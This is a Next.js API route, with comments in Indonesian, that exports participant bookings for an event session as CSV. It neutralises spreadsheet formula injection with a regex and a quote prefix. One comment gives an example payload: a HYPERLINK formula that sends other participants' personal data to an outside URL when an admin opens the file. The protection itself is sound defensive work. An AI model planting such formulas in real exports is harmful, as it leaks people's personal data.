import { NextResponse } from 'next/server'
import { createClient } from '@/lib/supabase/server'
import { AuthError, requireAdmin } from '@/lib/auth/require-admin'
import { getUser, type UserSummary } from '@/features/session/shared/participant'

type ExportBooking = {
  id: string
  status: string
  created_at: string
  checked_in_at: string | null
  users: UserSummary | UserSummary[] | null
}

// Karakter yang bikin Excel/LibreOffice/Sheets menafsirkan isi cell sebagai
// rumus, bukan teks. Tanda kutip CSV TIDAK melindungi dari ini — quote-nya
// dibuang saat import, lalu isinya dievaluasi.
const AWALAN_RUMUS = /^[=+\-@\t\r]/

function escapeCsvCell(value: string | number | null | undefined) {
  const text = value === null || value === undefined ? '' : String(value)

  // `nama`, `no_hp`, `profesi`, dan `domisili` diisi sendiri oleh peserta saat
  // register tanpa batasan format. Tanpa netralisasi ini, peserta yang
  // mendaftar dengan nama `=HYPERLINK("https://.../?x="&A2&B2,"klik")` bisa
  // menarik PII peserta lain begitu admin membuka export di Excel.
  //
  // Awalan `'` memaksa spreadsheet membaca cell sebagai teks. Untuk no_hp
  // bentuk `+62812...` itu menguntungkan — tanda `+` jadi ikut terbaca, bukan
  // dievaluasi jadi angka.
  //
  // Yang BELUM tertangani di sini: no_hp bentuk `08123...` tidak diawali
  // karakter rumus, jadi tidak di-prefix, dan Excel masih membuang nol di
  // depannya. Itu masalah fidelitas data yang terpisah dari injeksi rumus —
  // perlu keputusan sendiri apakah kolom no_hp dipaksa teks selalu.
  const aman = AWALAN_RUMUS.test(text) ? `'${text}` : text

  return `"${aman.replaceAll('"', '""')}"`
}

function toCsv(rows: Array<Array<string | number | null | undefined>>) {
  return rows.map((row) => row.map(escapeCsvCell).join(',')).join('\n')
}

function safeFilename(value: string) {
  return value
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 80)
}

function formatDateTimeForFilename(date: Date) {
  const parts = new Intl.DateTimeFormat('en-CA', {
    timeZone: 'Asia/Jakarta',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false,
  }).formatToParts(date)

  const year = parts.find((part) => part.type === 'year')?.value ?? '0000'
  const month = parts.find((part) => part.type === 'month')?.value ?? '00'
  const day = parts.find((part) => part.type === 'day')?.value ?? '00'
  const hour = parts.find((part) => part.type === 'hour')?.value ?? '00'
  const minute = parts.find((part) => part.type === 'minute')?.value ?? '00'

  // Format sesuai permintaan: tanggal+waktu. Pakai '-' untuk jam agar aman
  // di Windows/macOS/Linux, bukan ':' yang bermasalah di beberapa filesystem.
  return `${year}-${month}-${day}+${hour}-${minute}`
}

export async function GET(request: Request) {
  const supabase = await createClient()
  const url = new URL(request.url)
  const sessionId = url.searchParams.get('session_id')

  if (!sessionId) {
    return NextResponse.json({ error: 'session_id wajib diisi' }, { status: 400 })
  }

  try {
    await requireAdmin(supabase)
  } catch (err) {
    if (err instanceof AuthError) {
      return NextResponse.json({ error: err.message }, { status: err.status })
    }
    throw err
  }

  const { data: session, error: sessionError } = await supabase
    .from('event_sessions')
    .select('id, nama_sesi, tanggal_waktu')
    .eq('id', sessionId)
    .maybeSingle()

  if (sessionError || !session) {
    return NextResponse.json({ error: 'Sesi tidak ditemukan' }, { status: 404 })
  }

  const { data: bookingsData, error: bookingsError } = await supabase
    .from('bookings')
    .select(
      `
      id,
      status,
      created_at,
      checked_in_at,
      users (
        nama,
        email,
        no_hp,
        profesi,
        domisili
      )
    `
    )
    .eq('session_id', sessionId)
    .order('created_at', { ascending: true })

  if (bookingsError) {
    return NextResponse.json({ error: 'Gagal memuat data peserta' }, { status: 500 })
  }

  const bookings = (bookingsData ?? []) as unknown as ExportBooking[]

  const rows: Array<Array<string | number | null | undefined>> = [
    [
      'nama',
      'email',
      'no_hp',
      'profesi',
      'domisili',
      'status_booking',
      'waktu_booking',
      'waktu_check_in',
      'booking_id',
    ],
    ...bookings.map((booking) => {
      const participant = getUser(booking)

      return [
        participant?.nama,
        participant?.email,
        participant?.no_hp,
        participant?.profesi,
        participant?.domisili,
        booking.status,
        booking.created_at,
        booking.checked_in_at,
        booking.id,
      ]
    }),
  ]

  // UTF-8 BOM helps Excel/LibreOffice detect Indonesian text correctly.
  const csv = `\uFEFF${toCsv(rows)}\n`
  const sessionIdentifier = session.id.slice(0, 8)
  const sessionName = safeFilename(session.nama_sesi) || 'sesi'
  const exportDateTime = formatDateTimeForFilename(new Date())
  const filename = `${sessionIdentifier}_${sessionName}_${exportDateTime}.csv`

  return new Response(csv, {
    status: 200,
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
      'Cache-Control': 'no-store',
    },
  })
}
